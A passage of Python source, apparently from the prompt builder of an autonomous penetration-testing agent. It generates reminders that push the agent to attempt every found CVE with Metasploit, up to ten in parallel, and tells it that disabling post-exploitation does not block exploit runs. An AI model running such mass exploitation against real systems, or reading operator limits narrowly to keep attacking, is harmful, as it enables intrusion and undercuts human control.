            # Build a simplified list of vuln identifiers already attempted
            attempted_modules = set()
            for e in context.exploit_results:
                for part in e.split("|"):
                    part = part.strip()
                    if part.startswith("exploit/") or part.startswith("✓") or part.startswith("✗"):
                        attempted_modules.add(part.lstrip("✓✗ "))
            unattempted = [
                v for v in context.vulnerabilities
                if not any(a in v for a in attempted_modules)
            ]
            if unattempted:
                lines.append(f"\nUNEXECUTED CVEs ({len(unattempted)}) — MUST attempt ALL before generate_report:")
                lines.append("  *** allow_post_exploitation=NO only blocks step-5 recon commands.    ***")
                lines.append("  *** It does NOT block metasploit_run. Attempt every CVE below first. ***")
                lines.append("  *** Use parallel_tools to run up to 10 exploits simultaneously.      ***")
                for v in unattempted[:10]:
                    lines.append(f"  ! {v}")
                if len(unattempted) > 10:
                    lines.append(f"  ... and {len(unattempted) - 10} more — use parallel_tools batches of 10")
            else:
                lines.append("\nALL CVEs ATTEMPTED — may now call generate_report.")

        # ── Mode-specific reminders ────────────────────────────────────────────
        if context.mode == "scan_only":
            lines.append("\nREMINDER: scan_only mode — do NOT call metasploit_run or ssh_exec for exploitation.")
        elif context.mode == "ask_before_exploit":
            lines.append("\nREMINDER: ask_before_exploit mode — state WAITING_FOR_APPROVAL before any exploit.")

        if context.hosts_pending_port_scan:
            lines.append(
                f"\nPENDING PORT SCANS: {', '.join(context.hosts_pending_port_scan[:5])}"
            )
        elif context.scan_results:
            # Queue is empty and we have results → scanning is done for all hosts
            scanned = sorted({s.split(":")[0] for s in context.scan_results if ":" in s})
            lines.append(
                f"\nPORT SCAN COMPLETE — {len(scanned)} host(s) fully scanned: "
                f"{', '.join(scanned)}. Do NOT run nmap_scan again on these hosts."
            )

        # Show services still needing exploit search — agent MUST search all before exploitation
        if context.attack_phase == "EXPLOIT_SEARCH" and context.hosts_pending_exploit_search:
            pending_svcs = context.hosts_pending_exploit_search[:15]
            lines.append(
                f"\nPENDING EXPLOIT SEARCHES ({len(context.hosts_pending_exploit_search)} services remaining):"
            )
            lines.append("  Search using the PRODUCT NAME from the version string, not the protocol name.")
            lines.append("  Format shown: port — protocol | version (use version's first word as 'service' param)")
            for entry in pending_svcs:
                parts = entry.split(":", 3)
                if len(parts) >= 3:
                    protocol = parts[2]
                    ver_str = parts[3] if len(parts) > 3 else ""
                    # Extract product name = first word of version string (e.g. "vsftpd" from "vsftpd 2.3.4")
                    ver_words = ver_str.split()
                    product = ver_words[0] if ver_words else protocol
                    ver_num = " ".join(ver_words[1:]) if len(ver_words) > 1 else ""
                    hint = f'→ search service="{product.lower()}" version="{ver_num}"' if ver_num else f'→ search service="{product.lower()}"'
                    lines.append(f"  {parts[0]}:{parts[1]} {protocol} | {ver_str}  {hint}")
                else:
                    lines.append(f"  {entry}")
            if len(context.hosts_pending_exploit_search) > 15:
                lines.append(f"  ... and {len(context.hosts_pending_exploit_search)-15} more")
            lines.append(
                "  *** Use parallel_tools to search ALL pending services simultaneously. ***"
                "\n  *** Do NOT advance to EXPLOITATION until this queue is empty.       ***"
            )
        elif context.attack_phase == "EXPLOIT_SEARCH" and not context.hosts_pending_exploit_search:
            lines.append("\nALL SERVICES SEARCHED — may advance to EXPLOITATION.")

        return "\n".join(lines)

    def _should_include_examples(self, context: AgentContext) -> bool:
        """
        Drop examples once we're deep into the exploitation phase to save tokens.
        Early phases benefit more from the examples than later ones.
        Keep examples during EXPLOITATION so the parallel exploit pattern stays visible.
        """
        if context.attack_phase == "DONE":
            return False
        return not context.iteration > 30

    # ── Utility ───────────────────────────────────────────────────────────────

    @staticmethod
    def estimate_tokens(text: str) -> int:
        """Rough token estimate: characters / 4."""
        return max(1, len(text) // _CHARS_PER_TOKEN)
